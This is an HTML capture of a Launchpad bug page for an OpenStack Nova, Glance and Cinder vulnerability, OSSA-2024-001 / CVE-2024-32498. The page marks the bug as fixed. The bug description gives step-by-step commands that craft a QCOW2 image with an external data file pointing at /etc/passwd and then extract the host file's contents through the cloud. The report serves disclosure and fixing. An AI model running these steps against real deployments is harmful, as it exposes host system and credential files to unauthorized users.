<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr">
  <head>
<base href="https://bugs.launchpad.net/nova/+bug/2059809/+index" />

    <meta charset="UTF-8" />
    <title>Bug #2059809 “[OSSA-2024-001] Arbitrary file access through QCOW...” : Bugs : OpenStack Compute (nova)</title>
    <link rel="apple-touch-icon" sizes="180x180" href="/@@/apple-touch-icon.png?v=2022" />
    <link rel="icon" type="image/png" sizes="32x32" href="/@@/favicon-32x32.png?v=2022" />
    <link rel="icon" type="image/png" sizes="16x16" href="/@@/favicon-16x16.png?v=2022" />
    <link rel="manifest" href="/@@/site.webmanifest?v=2022" />
    <link rel="mask-icon" href="/@@/safari-pinned-tab.svg?v=2022" color="#e9531f" />
    <link rel="shortcut icon" href="/@@/favicon.ico?v=2022" />
    <meta name="msapplication-TileColor" content="#da532c" />
    <meta name="msapplication-config" content="/@@/browserconfig.xml?v=2022" />
    <meta name="theme-color" content="#ffffff" />
    <link rel="canonical" href="https://bugs.launchpad.net/bugs/2059809" />
    
      <link rel="alternate" type="application/atom+xml" href="http://feeds.launchpad.net/bugs/2059809/bug.atom" title="Bug 2059809 Feed" />
    

    
  
  <link type="text/css" rel="stylesheet" media="screen, print" href="/+icing/rev6394e03793719e8d73f5a60b5439440e693c92f1/combo.css" />


    

    
      <meta name="description" content="OpenStack has security vulnerability in Nova or Glance, that allows an authenticated attacker to read arbitrary files.
QCOW2 has two mechanisms to read from another file. The backing file issue was reported and fixed with OSSA-2015-014, but the external data file was not discovered.

Steps to Reproduce:

- Create a disk image: `qemu-img create -f qcow2 -o data_file=abcdefghigh,data_file_raw=on disk.qcow2 1G` with `abcdefghigh` a placeholder of the same length as the file to read. `qemu-img` w..." />
      <meta property="og:description" content="OpenStack has security vulnerability in Nova or Glance, that allows an authenticated attacker to read arbitrary files.
QCOW2 has two mechanisms to read from another file. The backing file issue was reported and fixed with OSSA-2015-014, but the external data file was not discovered.

Steps to Reproduce:

- Create a disk image: `qemu-img create -f qcow2 -o data_file=abcdefghigh,data_file_raw=on disk.qcow2 1G` with `abcdefghigh` a placeholder of the same length as the file to read. `qemu-img` w..." />
    

    
    
      <meta property="og:title" content="Bug #2059809 “[OSSA-2024-001] Arbitrary file access through QCOW...” : Bugs : OpenStack Compute (nova)" />
      <meta property="og:type" content="website" />
      <meta property="og:image" content="/@@/launchpad-og-image.png" />
      <meta property="og:url" content="https://bugs.launchpad.net/bugs/2059809" />
      <meta property="og:site_name" content="Launchpad" />
    

    

    
  

  
  
  <script type="text/javascript">
    var LP = {
        cache: {},
        links: {}
    };
  </script>

  

  <script type="text/javascript">var cookie_scope = '; Path=/; Secure; Domain=.launchpad.net';</script>

   <script type="text/javascript" src="/+combo/rev6394e03793719e8d73f5a60b5439440e693c92f1/?yui/yui/yui-min.js&amp;lp/meta.js&amp;yui/loader/loader-min.js"></script>
   <script type="text/javascript">
        var raw = null;
        if (LP.devmode) {
           raw = 'raw';
        }
        YUI.GlobalConfig = {
            combine: true,
            comboBase: '/+combo/rev6394e03793719e8d73f5a60b5439440e693c92f1/?',
            root: 'yui/',
            filter: raw,
            debug: false,
            fetchCSS: false,
            maxURLLength: 2000,
            groups: {
                lp: {
                    combine: true,
                    base: '/+combo/rev6394e03793719e8d73f5a60b5439440e693c92f1/?lp/',
                    comboBase: '/+combo/rev6394e03793719e8d73f5a60b5439440e693c92f1/?',
                    root: 'lp/',
                    // comes from including lp/meta.js
                    modules: LP_MODULES,
                    fetchCSS: false
                }
            }
        }</script>

  <script type="text/javascript">
      // we need this to create a single YUI instance all events and code
      // talks across. All instances of YUI().use should be based off of
      // LPJS instead.
      var LPJS = new YUI();
  </script>



    <script id="base-layout-load-scripts" type="text/javascript">
        //<![CDATA[
        LPJS.use('base', 'node', 'console', 'event',
            'oop', 'lp', 'lp.app.foldables','lp.app.sorttable',
            'lp.app.inlinehelp', 'lp.app.links',
            'lp.bugs.bugtask_index', 'lp.bugs.subscribers',
            'lp.app.ellipsis', 'lp.code.branchmergeproposal.diff',
            'lp.views.global',
             function(Y) {

            Y.on("domready", function () {
                var global_view = new Y.lp.views.Global();
                global_view.render();

                Y.lp.app.sorttable.SortTable.init();
                Y.lp.app.inlinehelp.init_help();
                Y.lp.activate_collapsibles();
                Y.lp.app.foldables.activate();
                Y.lp.app.links.check_valid_lp_links();
            });

            Y.on('lp:context:web_link:changed', function(e) {
                  window.location = e.new_value;
            });
        });
        //]]>
    </script>
    <script id="base-helper-functions" type="text/javascript">
         //<![CDATA[
        // This code is pulled from lp.js that needs to be available on every
        // request. Pulling here to get it outside the scope of the YUI block.
        function setFocusByName(name) {
            // Focus the first element matching the given name which can be focused.
            var nodes = document.getElementsByName(name);
            var i, node;
            for (i = 0; i < nodes.length; i++) {
                node = nodes[i];
                if (node.focus) {
                    try {
                        // Trying to focus a hidden element throws an error in IE8.
                        if (node.offsetHeight !== 0) {
                            node.focus();
                        }
                    } catch (e) {
                        LPJS.use('console', function(Y) {
                            Y.log('In setFocusByName(<' +
                                node.tagName + ' type=' + node.type + '>): ' + e);
                        });
                    }
                    break;
                }
            }
        }

        function selectWidget(widget_name, event) {
          if (event && (event.keyCode === 9 || event.keyCode === 13)) {
              // Avoid firing if user is tabbing through or simply pressing
              // enter to submit the form.
              return;
          }
          document.getElementById(widget_name).checked = true;
        }
        //]]>
    </script>

    
      
      <script type="text/javascript" id="available-official-tags-js">var available_official_tags = ["antelope-rc-potential", "api", "api-ref", "availability-zones", "backup-service", "bobcat-rc-potential", "bugsmash", "cache", "cells", "ceph", "cinder", "compute", "conductor", "config", "console", "cyborg", "dalmatian-rc-potential", "db", "doc", "documentation", "domain-proxy", "ec2", "evacuate", "fault-injection", "gate", "gate-failure", "glance", "grizzly-backport-potential", "havana-backport-potential", "hyper-v", "i18n", "icehouse-backport-potential", "icehouse-rc-potential", "image-cache", "in-stable-liberty", "in-stable-newton", "in-stable-ocata", "ironic", "kilo-backport-potential", "liberty-backport-potential", "libvirt", "live-migration", "low-hanging-fruit", "lxc", "metadata", "metadef", "mitaka-backport-potential", "needs-attention", "needs-functional-test", "needs.openstack-version", "network", "neutron", "newton-backport-potential", "nfs", "notifications", "nova-manage", "nova-network", "numa", "ocata-backport-potential", "ocata-rc-potential", "openstack-version.grizzly", "openstack-version.havana", "openstack-version.icehouse", "openstack-version.juno", "openstack-version.kilo", "openstack-version.liberty", "openstack-version.mitaka", "openstack-version.newton", "openstack-version.ocata", "openstack-version.pike", "ops", "oslo", "pci", "performance", "pike-backport-potential", "placement", "policy", "postgresql", "powervm", "privsep", "queens-backport-potential", "quotas", "race-condition", "rbac", "reboot", "rebuild", "rescue", "resize", "resource-tracker", "rfe", "rootwrap", "s390x", "scheduler", "scrubber", "sdk", "security", "security-groups", "serviceability", "shared-storage", "shelve", "snapshot", "stacktrace", "stein-rc-potential", "testing", "train-rc-potential", "unified-objects", "upgrade", "ussuri-backport-potential", "ussuri-rc-potential", "vgpu", "victoria-rc-potential", "vmware", "volumes", "wallaby-rc-potential", "xen", "xena-rc-potential", "xenserver", "yoga-rc-potential", "zed-rc-potential", "zvm"];</script>
      <script type="text/javascript">
        LPJS.use('base', 'node', 'oop', 'event', 'lp.bugs.bugtask_index',
                  'lp.bugs.subscribers', 'lp.code.branchmergeproposal.diff',
                  'lp.app.comment', 'lp.services.messages.edit', function(Y) {
            Y.on('domready', function() {
                Y.lp.code.branchmergeproposal.diff.connect_diff_links();
                Y.lp.bugs.bugtask_index.setup_bugtask_index();
                Y.lp.bugs.bugtask_index.setup_bugtask_table();
                LP.cache.comment_context = LP.cache.bug;
                var cl = new Y.lp.app.comment.CommentList();
                cl.render();
                var sl = new Y.lp.bugs.subscribers.createBugSubscribersLoader({
                    container_box: '#other-bug-subscribers',
                    subscribers_details_view:
                        '/+bug-portlet-subscribers-details',
                    subscribe_someone_else_link: '.menu-link-addsubscriber'
                }, window);

                Y.lp.services.messages.edit.setup();
            });
         });
      </script>
      <style type="text/css">
        /* Align the 'add comment' link to the right of the comment box. */
        #add-comment-form textarea { width: 100%; }
        #add-comment-form { max-width: 60em; padding-bottom: 4em; }
        #add-comment-form .actions {float: right;}
        .buglink-summary dd { font-size: 10px; }
        a#privacy-link:link:hover, a#privacy-link:visited:hover {text-decoration:none;}
      </style>
      <style type="text/css">
        .yui3-overlay .value label  {
          /* It normally makes sense for form labels to be bold, but since
          this form consists only of radio buttons, there's nothing but labels
          so we just get wall-to-wall bold. */
          font-weight: normal !important;
        }
      </style>
    
    
  </head>

  <body id="document" itemscope="" itemtype="http://schema.org/WebPage" class="tab-bugs
      main_side
      public
      yui3-skin-sam">
          
          
    <div class="yui-d0">
      <div id="locationbar" class="login-logout">
        

<div id="logincontrol"><a href="https://bugs.launchpad.net/nova/+bug/2059809/+login">Log in / Register</a></div>



      </div><!--id="locationbar"-->

      <div id="watermark" class="watermark-apps-portlet">
        <div>
          <a href="https://launchpad.net/nova"><img alt="" width="64" height="64" src="https://launchpadlibrarian.net/324577028/nova64.png" /></a>
        </div>
        <div class="wide">
          <h2 id="watermark-heading"><a href="https://launchpad.net/nova">OpenStack Compute (nova)</a></h2>
        </div>
        
  <!-- Application Menu -->
  <ul class="facetmenu">
    
      
      <li class="overview"><a href="https://launchpad.net/nova">Overview</a></li>
      
    
    
      
      <li class="branches"><a href="https://code.launchpad.net/nova">Code</a></li>
      
    
    
      <li class="bugs active"><a href="https://bugs.launchpad.net/nova">Bugs</a></li>
      
      
    
    
      
      <li class="specifications"><a href="https://blueprints.launchpad.net/nova">Blueprints</a></li>
      
    
    
      
      <li class="translations"><a href="https://translations.launchpad.net/nova">Translations</a></li>
      
    
    
      
      <li class="answers"><a href="https://answers.launchpad.net/nova">Answers</a></li>
      
    
  </ul>

      </div>

      <div class="yui-t4">
        <div id="maincontent" class="yui-main">
          <div class="yui-b" dir="ltr">
            <div class="context-publication">
              
      <h1 id="edit-title">
<span class="yui3-editable_text-text ellipsis" style="max-width: 95%;">
    [OSSA-2024-001] Arbitrary file access through QCOW2 external data file (CVE-2024-32498)
</span>
  
</h1>



    
              

              <div id="registration" class="registering">
                
      Bug #2059809 reported by
      <a href="https://launchpad.net/~mkaesberger" class="sprite person">Martin Kaesberger</a>
      <time title="2024-03-29 19:31:33 UTC" datetime="2024-03-29T19:31:33.550685+00:00">on 2024-03-29</time>
      
    
              </div>
            </div>

            
            <div id="request-notifications">
              
            </div>

            
              <div>

      

      <div id="bug-is-duplicate">
          
      </div>
      

      <div style="float: right;">
        <span><a href="/+help-bugs/bug-heat.html" target="help" class="sprite flame">376</a></span>
      </div>

      


  
  
    <div class="actions">
      <span id="affectsmetoo" style="display: inline">This bug affects 5 people</span>
    </div>
  



    <table id="affected-software" class="listing">
      <thead>
        <tr>
          <th colspan="2">Affects</th>
          <th>Status</th>
          <th>Importance</th>
          <th>Assigned to</th>
          <th>Milestone</th>
        </tr>
      </thead>

      <tbody>
        
          
  <tr id="tasksummary3175320">
    <td>
      
    </td>
    
    <td>
      <span id="bugtarget-picker-tasksummary3175320">
        <span class="yui3-activator-data-box">
            <a class="sprite product" href="https://bugs.launchpad.net/cinder">Cinder</a>
        </span>
        
        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        
      </span>
    </td>

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        <span style="float: left" class="value statusFIXRELEASED">Fix Released</span>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceCRITICAL">Critical</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary3175320">
          <span class="yui3-activator-data-box">
            <a class="sprite person" href="https://launchpad.net/~brian-rosmaita">Brian Rosmaita</a>
            
          </span>
          
          
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      <div class="milestone-content" style="width: 100%; float: left">
        
        <a class="value" href=""></a>
        
      </div>
    </td>

    
  </tr>

  


        
        
          
  <tr id="tasksummary3175319">
    <td>
      
    </td>
    
    <td>
      <span id="bugtarget-picker-tasksummary3175319">
        <span class="yui3-activator-data-box">
            <a class="sprite product" href="https://bugs.launchpad.net/glance">Glance</a>
        </span>
        
        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        
      </span>
    </td>

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        <span style="float: left" class="value statusFIXRELEASED">Fix Released</span>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceCRITICAL">Critical</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary3175319">
          <span class="yui3-activator-data-box">
            <a class="sprite person" href="https://launchpad.net/~danms">Dan Smith</a>
            
          </span>
          
          
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      <div class="milestone-content" style="width: 100%; float: left">
        
        <a class="value" href=""></a>
        
      </div>
    </td>

    
  </tr>

  


        
        
          
  <tr class="highlight" id="tasksummary3175112">
    <td>
      
    </td>
    
    <td>
      <span id="bugtarget-picker-tasksummary3175112">
        <span class="yui3-activator-data-box">
            <a class="sprite product" href="https://bugs.launchpad.net/nova">OpenStack Compute (nova)</a>
        </span>
        
        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        
      </span>
    </td>

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        <span style="float: left" class="value statusFIXRELEASED">Fix Released</span>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceCRITICAL">Critical</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary3175112">
          <span class="yui3-activator-data-box">
            <a class="sprite person" href="https://launchpad.net/~sylvain-bauza">Sylvain Bauza</a>
            
          </span>
          
          
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      <div class="milestone-content" style="width: 100%; float: left">
        
        <a class="value" href=""></a>
        
      </div>
    </td>

    
  </tr>

  


        
        
          
  <tr id="tasksummary3175185">
    <td>
      
    </td>
    
    <td>
      <span id="bugtarget-picker-tasksummary3175185">
        <span class="yui3-activator-data-box">
            <a class="sprite product" href="https://bugs.launchpad.net/ossa">OpenStack Security Advisory</a>
        </span>
        
        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        
      </span>
    </td>

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        <span style="float: left" class="value statusFIXRELEASED">Fix Released</span>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceHIGH">High</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary3175185">
          <span class="yui3-activator-data-box">
            <a class="sprite person" href="https://launchpad.net/~fungi">Jeremy Stanley</a>
            
          </span>
          
          
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      
    </td>

    
  </tr>

  


        
        
          
  <tr id="tasksummary3217263">
    <td>
      
    </td>
    
    <td>
      <span id="bugtarget-picker-tasksummary3217263">
        <span class="yui3-activator-data-box">
            <a class="sprite product" href="https://bugs.launchpad.net/cloud-archive">Ubuntu Cloud Archive</a>
        </span>
        
        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        
      </span>
    </td>

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        <span style="float: left" class="value statusFIXRELEASED">Fix Released</span>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary3217263">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      
    </td>

    
  </tr>

  


        
        
          
  <tr id="tasksummary3217267">
    <td>
      
    </td>
    <td style="padding: 0.3em 0em 0.3em 1.5em">
      <span class="sprite milestone"></span>
      
        <a href="https://bugs.launchpad.net/cloud-archive/antelope">Antelope</a>
      
        
    </td>
    

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        <span style="float: left" class="value statusFIXRELEASED">Fix Released</span>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary3217267">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      
    </td>

    
  </tr>

  


        
        
          
  <tr id="tasksummary3217266">
    <td>
      
    </td>
    <td style="padding: 0.3em 0em 0.3em 1.5em">
      <span class="sprite milestone"></span>
      
        <a href="https://bugs.launchpad.net/cloud-archive/bobcat">Bobcat</a>
      
        
    </td>
    

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        <span style="float: left" class="value statusFIXRELEASED">Fix Released</span>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary3217266">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      
    </td>

    
  </tr>

  


        
        
          
  <tr id="tasksummary3217264">
    <td>
      
    </td>
    <td style="padding: 0.3em 0em 0.3em 1.5em">
      <span class="sprite milestone"></span>
      
        <a href="https://bugs.launchpad.net/cloud-archive/caracal">Caracal</a>
      
        
    </td>
    

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        <span style="float: left" class="value statusFIXRELEASED">Fix Released</span>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary3217264">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      
    </td>

    
  </tr>

  


        
        
          
  <tr id="tasksummary3217268">
    <td>
      
    </td>
    <td style="padding: 0.3em 0em 0.3em 1.5em">
      <span class="sprite milestone"></span>
      
        <a href="https://bugs.launchpad.net/cloud-archive/ussuri">Ussuri</a>
      
        
    </td>
    

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        <span style="float: left" class="value statusFIXCOMMITTED">Fix Committed</span>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary3217268">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      
    </td>

    
  </tr>

  


        
        
          
  <tr id="tasksummary3217265">
    <td>
      
    </td>
    <td style="padding: 0.3em 0em 0.3em 1.5em">
      <span class="sprite milestone"></span>
      
        <a href="https://bugs.launchpad.net/cloud-archive/yoga">Yoga</a>
      
        
    </td>
    

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        <span style="float: left" class="value statusFIXRELEASED">Fix Released</span>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary3217265">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      
    </td>

    
  </tr>

  


        
      </tbody>

    </table>








      <div id="maincontentsub">
        <div class="top-portlet">

      <div itemprop="mainContentOfPage" class="report">
        

        <div>
  <div class="lazr-multiline-edit" id="edit-description">
  <div class="clearfix">
    

    <h3>Bug Description</h3>
  </div>

  <div class="yui3-editable_text-text"><p>OpenStack has security vulnerability in Nova or Glance, that allows an authenticated attacker to read arbitrary files.<br />
QCOW2 has two mechanisms to read from another file. The backing file issue was reported and fixed with OSSA-2015-014, but the external data file was not discovered.</p>
<p>Steps to Reproduce:</p>
<p>- Create a disk image: `qemu-img create -f qcow2 -o data_file=<wbr />abcdefghigh,<wbr />data_file_<wbr />raw=on disk.qcow2 1G` with `abcdefghigh` a placeholder of the same length as the file to read. `qemu-img` will zero it.<br />
- Replace the filename in the disk image: `sed -i &quot;s#abcdefghigh#<wbr />/etc/passwd#<wbr />&quot; disk.qcow2`.<br />
- Upload/register the disk image: `openstack image create --disk-format qcow2 --container-format bare --file &quot;disk.qcow2&quot; --private &quot;my-image&quot;`.<br />
- Create a new instance: `openstack server create --flavor &quot;nano&quot; --image &quot;my-image&quot; &quot;my-instance&quot;`.</p>
<p>With the non-bootable instance there might be two ways to continue:</p>
<p>Option 1:<br />
- Derive a new image: `openstack server image create --name &quot;my-leak&quot; &quot;my-instance&quot;`<br />
- Download the image: `openstack image save --file &quot;leak.qcow2&quot; &quot;my-leak&quot;`<br />
- The file content starts at guest cluster 0</p>
<p>Option 2: (this is untested because I reproduced it only in a production system)<br />
- Reboot the instance in rescue mode: `openstack server rescue --image &quot;cirros-<wbr />0.6.2-x86_<wbr />64-disk&quot; &quot;my-instance&quot;`.<br />
- Go to the Dashboard, open the console of the instance and login to the instance.<br />
- Extract content from `/dev/sdb` with `cat /dev/sdb | fold -w 1024 | head -n 32`, `xxd -l 1024 -c 32 /dev/sdb` or similar methods.<br />
- It might be possible to write to the host file. If the disk image is mounted with `qemu-nbd`, writes go through to the external data file.</p></div>
  </div>

  
</div>


        <div style="margin:-10px 0 20px 5px" class="clearfix">
          
        </div>

        <div id="bug-tags">
          <span id="tags-heading">
            Tags:
          </span>
          <span id="tag-list">
            <a class="unofficial-tag" href="/nova/+bugs?field.tag=in-unmaintained-wallaby">in-unmaintained-wallaby</a>
            <a class="unofficial-tag" href="/nova/+bugs?field.tag=in-unmaintained-xena">in-unmaintained-xena</a>
            <a class="unofficial-tag" href="/nova/+bugs?field.tag=in-unmaintained-yoga">in-unmaintained-yoga</a>
            <a class="unofficial-tag" href="/nova/+bugs?field.tag=in-unmaintained-zed">in-unmaintained-zed</a>
            <a class="unofficial-tag" href="/nova/+bugs?field.tag=verification-ussuri-needed">verification-ussuri-needed</a>
          </span>
          
        </div>

        <script type="text/javascript">
          LPJS.use('event', 'node', 'lp.bugs.tags_entry', function(Y) {
              Y.on('domready',
                   function(e) {
                       Y.lp.bugs.tags_entry.setup_tag_entry(
                           available_official_tags);
                   },
                   window);
          });
        </script>

        <div class="clearfix"></div>
      </div>

      <div id="branches-and-cves">
        <div id="bug-branches-container" style="float: left">
          
        </div><!-- bug-branch-container -->

        <div class="cves">
          <h2>CVE References</h2>
          <ul>
            <li class="sprite cve">
              <a href="/bugs/cve/2020-10755" title="An insecure-credentials flaw was foun...">2020-10755</a>
            </li>
            <li class="sprite cve">
              <a href="/bugs/cve/2022-47951" title="An issue was discovered in OpenStack ...">2022-47951</a>
            </li>
            <li class="sprite cve">
              <a href="/bugs/cve/2023-2088" title="A flaw was found in OpenStack due to ...">2023-2088</a>
            </li>
            <li class="sprite cve">
              <a href="/bugs/cve/2024-32498" title="** RESERVED ** This candidate has bee...">2024-32498</a>
            </li>
            <li class="sprite cve">
              <a href="/bugs/cve/2024-4467" title="** RESERVED ** This candidate has bee...">2024-4467</a>
            </li>
          </ul>
        </div>

        <div class="clearfix"></div>
      </div> <!-- branches and CVEs -->

      </div>

      <div>
      
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/1" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-03-30T17:01:58.582417+00:00" title="2024-03-30 17:01:58 UTC">on 2024-03-30</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/1"> #1</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Since this report concerns a possible security risk, an incomplete<br />
security advisory task has been added while the core security<br />
reviewers for the affected project or projects confirm the bug and<br />
discuss the scope of any vulnerability along with potential<br />
solutions.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Since this report concerns a possible security risk, an incomplete
security advisory task has been added while the core security
reviewers for the affected project or projects confirm the bug and
discuss the scope of any vulnerability along with potential
solutions.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>description</b>:
      </td>
      <td>
        updated
      </td>
    </tr>
  
  
    
      <tr>
        <td colspan="2">Changed in ossa: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Incomplete
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2059809/comments/2" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-03-30T17:05:59.072563+00:00" title="2024-03-30 17:05:59 UTC">on 2024-03-30</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2059809/comments/2"> #2</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
